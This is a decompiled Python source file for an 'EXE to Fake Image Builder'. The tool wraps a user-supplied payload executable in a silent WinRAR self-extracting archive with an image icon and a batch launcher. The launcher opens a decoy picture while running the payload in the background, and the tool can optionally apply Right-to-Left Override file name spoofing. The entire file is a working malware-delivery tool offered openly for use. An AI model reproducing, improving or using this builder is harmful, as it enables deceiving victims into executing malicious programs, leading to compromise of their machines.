# Decompiled with PyLingual cmd version ( https://nizzix.xyz )
# Internal filename: 'exe-to-image.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import subprocess
import shutil
import random
from colorama import init, Fore
from PIL import Image

init(autoreset=True)
LIGHTCYAN = Fore.LIGHTCYAN_EX

class EXEtoImageBuilder:
    def __init__(self):
        self.output_folder = os.path.join(os.getcwd(), 'output')
        self.winrar_path = self.find_winrar()
        self.payload_path = None
        self.image_path = None
        self.icon_path = None
        self.output_name = None
        self.fake_extension = None
        self.use_rlo = False
    
    def find_winrar(self):
        possible_paths = [
            'C:\\Program Files\\WinRAR\\WinRAR.exe',
            'C:\\Program Files (x86)\\WinRAR\\WinRAR.exe',
            'C:\\WinRAR\\WinRAR.exe'
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    
    def print_banner(self):
        print(LIGHTCYAN + '''
    ╔═══════════════════════════════════════════════════════════╗
    ║           EXE to Fake Image Builder v1.0                  ║
    ╚═══════════════════════════════════════════════════════════╝
    ''')
        print(LIGHTCYAN + '[+] Creates a self-extracting .exe that looks like an image')
        print(LIGHTCYAN + '[+] Uses custom icon + background image')
        print(LIGHTCYAN + '[+] Silently executes payload.exe in background')
        print(LIGHTCYAN + '[+] Opens the image simultaneously')
        print(LIGHTCYAN + '[+] Output in "output" folder\n')
    
    def get_user_input(self):
        os.makedirs(self.output_folder, exist_ok=True)
        print(LIGHTCYAN + '[*] Please provide the required files:\n')
        
        self.payload_path = input('[?] Path to payload (.exe): ').strip().strip('"')
        if not self.payload_path or not os.path.exists(self.payload_path) or not self.payload_path.lower().endswith('.exe'):
            print(Fore.RED + '[-] Invalid payload path!')
            sys.exit(1)
        
        self.image_path = input('[?] Path to image (jpg/png): ').strip().strip('"')
        if not self.image_path or not os.path.exists(self.image_path) or not self.image_path.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif')):
            print(Fore.RED + '[-] Invalid image path!')
            sys.exit(1)
        
        self.icon_path = input('[?] Path to icon (.ico): ').strip().strip('"')
        if not self.icon_path or not os.path.exists(self.icon_path) or not self.icon_path.lower().endswith('.ico'):
            print(Fore.RED + '[-] Invalid icon path! Icon is mandatory.')
            sys.exit(1)
        
        self.output_name = input('[?] Output filename (without extension): ').strip()
        if not self.output_name:
            self.output_name = 'output'
        
        base_name, ext = os.path.splitext(self.output_name)
        if ext.lower() in ['.exe', '.jpg', '.jpeg', '.png', '.gif', '.webp']:
            self.output_name = base_name
        
        print(LIGHTCYAN + '\n[?] Select fake extension:')
        print('  1. .jpg')
        print('  2. .jpeg')
        print('  3. .png')
        print('  4. .webp')
        print('  5. .gif')
        ext_choice = input('[?] Choice (1-5): ').strip()
        extensions = {'.jpg', '.jpeg', '.png', '.webp', '.gif'}
        ext_list = ['.jpg', '.jpeg', '.png', '.webp', '.gif']
        self.fake_extension = ext_list[int(ext_choice) - 1] if ext_choice.isdigit() and 1 <= int(ext_choice) <= 5 else '.jpg'
        
        use_rlo_input = input('[?] Use RLO spoofing? (y/n): ').strip().lower()
        self.use_rlo = use_rlo_input == 'y'
        
        print(LIGHTCYAN + f'[+] Output: {self.output_name}{self.fake_extension}.exe (RLO: {self.use_rlo})')
    
    def create_launcher_script(self, temp_dir, image_filename, payload_filename):
        script_content = f'@echo off\ncd /d "%~dp0"\nstart "" "{image_filename}"\nstart "" "{payload_filename}"\n'
        script_path = os.path.join(temp_dir, 'launcher.bat')
        with open(script_path, 'w') as f:
            f.write(script_content)
        return 'launcher.bat'
    
    def create_sfx_config(self, temp_dir, setup_script):
        config_content = f'Path=%TEMP%\nSilent=1\nOverwrite=1\nSetup={setup_script}\nTempMode\nTitle=Opening...\n'
        config_path = os.path.join(temp_dir, 'sfx_config.txt')
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def build(self):
        if not self.winrar_path:
            print(Fore.RED + '[-] ERROR: WinRAR not found! Please install WinRAR.')
            sys.exit(1)
        
        print(LIGHTCYAN + '[+] WinRAR found - building fake image...')
        temp_dir = os.path.join(self.output_folder, f'temp_{random.randint(10000, 99999)}')
        os.makedirs(temp_dir, exist_ok=True)
        
        try:
            safe_payload_name = 'app.exe'
            shutil.copy(self.payload_path, os.path.join(temp_dir, safe_payload_name))
            
            _, img_ext = os.path.splitext(self.image_path)
            safe_image_name = f'content{img_ext}'
            shutil.copy(self.image_path, os.path.join(temp_dir, safe_image_name))
            
            launcher_name = self.create_launcher_script(temp_dir, safe_image_name, safe_payload_name)
            config_path = self.create_sfx_config(temp_dir, launcher_name)
            
            if self.use_rlo:
                ext = self.fake_extension.replace('.', '')
                rev_ext = ext[::-1]
                final_output_name = f'{self.output_name}\u202e{rev_ext}.exe'
                print(LIGHTCYAN + f'[+] RLO Spoofing applied! File will appear as: {self.output_name}exe.{ext}')
            else:
                final_output_name = f'{self.output_name}{self.fake_extension}.exe'
            
            output_exe = os.path.join(self.output_folder, final_output_name)
            sfx_module = os.path.join(os.path.dirname(self.winrar_path), 'Default.SFX')
            
            if not os.path.exists(sfx_module):
                sfx_option = ['-sfx']
            else:
                sfx_option = [f'-sfx{sfx_module}']
            
            icon_option = [f'-iicon{self.icon_path}']
            command = [self.winrar_path, 'a', '-ep1', '-inul', *sfx_option, f'-z{config_path}', *icon_option, output_exe, os.path.join(temp_dir, '*')]
            
            print(LIGHTCYAN + '[*] Creating SFX executable...')
            result = subprocess.run(command, capture_output=True, text=True)
            
            if result.returncode == 0 and os.path.exists(output_exe):
                print(LIGHTCYAN + f'[+] SUCCESS! File created: {output_exe}')
                print(LIGHTCYAN + f'[+] It looks like {self.output_name}{self.fake_extension}')
                print(LIGHTCYAN + '[+] Double-click -> opens image + runs payload')
            else:
                print(Fore.RED + '[-] ERROR during creation:')
                print(Fore.RED + result.stderr or result.stdout)
        except Exception as e:
            print(Fore.RED + f'[-] An error occurred: {e}')
        finally:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
            print(LIGHTCYAN + '[+] Cleanup done')

def main():
    builder = EXEtoImageBuilder()
    builder.print_banner()
    builder.get_user_input()
    builder.build()

if __name__ == '__main__':
    main()
